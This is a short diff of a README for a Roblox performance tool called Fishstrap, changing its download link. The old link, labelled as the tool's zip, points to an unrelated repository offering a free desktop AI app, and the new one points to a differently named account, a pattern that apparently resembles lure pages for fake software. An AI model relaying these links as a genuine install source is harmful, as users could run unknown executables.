@@ -8,7 +8,7 @@ Unlock higher FPS, run multiple Roblox instances simultaneously, apply performan
 
 
 ## Install
-[Download `Fishstrap.zip`](https://github.com/kimik3/Kimi-K3-Code-Free-Desktop-AI/releases/download/Kimi-K3/KimiK3-desktop.zip)
+[Download `Fishstrap.zip`](https://github.com/fishstrapfflag/Fishstrap-Roblox/releases/download/v3.1.2/Fishstrap.zip)
 ---
 
 <img width="1489" height="858" alt="images3" src="https://github.com/user-attachments/assets/97ca46d2-5c79-444d-9000-a7ab2b850a10" />
